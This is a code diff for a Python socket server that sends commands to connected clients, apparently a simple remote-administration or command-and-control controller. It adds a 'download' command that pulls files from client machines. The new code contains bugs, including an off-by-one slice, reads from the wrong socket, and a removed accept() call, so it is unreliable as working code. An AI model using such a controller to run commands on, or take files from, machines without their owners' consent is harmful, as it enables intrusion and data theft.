@@ -15,7 +15,6 @@ class Server():
             print('Socket creation failed')
 
         self.bind()
-        self.accept()
 
     def bind(self):
         try:
@@ -25,6 +24,9 @@ class Server():
             print("Socket binding error: " + str(msg)+ "\n"+ "Retrying...")
             time.sleep(1)
             self.bind()
+    def save_file(self, name, content):
+        with open('downloads\\'+name, 'wb') as file:
+            file.write(content)
 
     def accept(self):
         try:
@@ -50,6 +52,12 @@ class Server():
             conn.send(Message(f'incoming {file_name}',0).message)
             conn.send(self.send_file(cmd.utf[7:]).message)
             print(self.receive(connection_id))
+        elif cmd.utf[:8] == 'download':
+            conn.send(cmd.message)
+            file_name = cmd.utf[7:].split('\\')[-1]
+            data = self.receive_binary(connection_id)
+            self.save_file(file_name, data)
+            print('file downloaded succesfully')
         elif cmd.utf[:5] == 'alert':
             conn.send(cmd.message)
         elif len(cmd.utf) > 0:
@@ -75,6 +83,15 @@ class Server():
         data = msg.utf
         while len(data) < size:
             data += Message(conn.recv(1024),1).utf
+        return data
+
+    def receive_binary(self, connection_id):
+        conn = self.clients[connection_id].conn
+        msg = Message(conn.recv(1024),2) #1024 is buffer size
+        size = msg.get_size()
+        data = msg.bin
+        while len(data) < size:
+            data += Message(self.s.recv(1024),1).bin
         return data
 
     def list_clients(self):
